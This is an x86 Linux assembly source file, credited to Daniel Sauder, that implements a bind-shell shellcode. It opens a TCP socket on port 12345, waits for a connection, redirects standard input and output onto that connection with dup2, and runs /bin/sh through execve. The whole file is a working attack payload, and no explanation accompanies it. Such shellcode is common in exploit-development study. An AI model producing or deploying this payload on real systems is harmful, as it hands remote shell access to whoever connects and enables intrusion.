; Author: Daniel Sauder
; Website: http://govolution.wordpress.com/about
; License http://creativecommons.org/licenses/by-sa/3.0/

global _start

section .text

_start:

  ; socket
  push BYTE 0x66    ; socketcall (syscall 102) 
  pop eax
  xor ebx, ebx 
  inc ebx           ; 1 = SYS_SOCKET = socket() 
  xor edx, edx
  push edx 
  push BYTE 0x1
  push BYTE 0x2
  mov ecx, esp
  int 0x80
  mov esi, eax
  
  ; bind
  push BYTE 0x66    ; socketcall (syscall 102) 
  pop eax
  inc ebx           ; ebx = 2 = SYS_BIND = bind()
  push edx
  push WORD 0x3930  ; Port 12345
  push WORD bx
  mov ecx, esp
  push BYTE 16
  push ecx
  push esi
  mov ecx, esp
  int 0x80

  ; listen
  mov BYTE al, 0x66 ; socketcall (syscall 102) 
  inc ebx
  inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
  push ebx
  push esi
  mov ecx, esp
  int 0x80

  ; accept
  mov BYTE al, 0x66 ; socketcall (syscall 102) 
  inc ebx           ; ebx = 5 = SYS_ACCEPT 
  push edx
  push edx
  push esi
  mov ecx, esp
  int 0x80

  ; dup2
  mov ebx, eax
  push BYTE 0x2 
  pop ecx
  mov BYTE al, 0x3F ; dup2  syscall 63
  int 0x80
  dec ecx
  mov BYTE al, 0x3F
  int 0x80
  dec ecx
  mov BYTE al, 0x3F
  int 0x80 
  
  ; execve
  mov BYTE al, 11   
  push edx 
  push 0x68732f2f  
  push 0x6e69622f  
  mov ebx, esp 
  push edx   
  mov edx, esp  
  push ebx 
  mov ecx, esp  
  int 0x80 
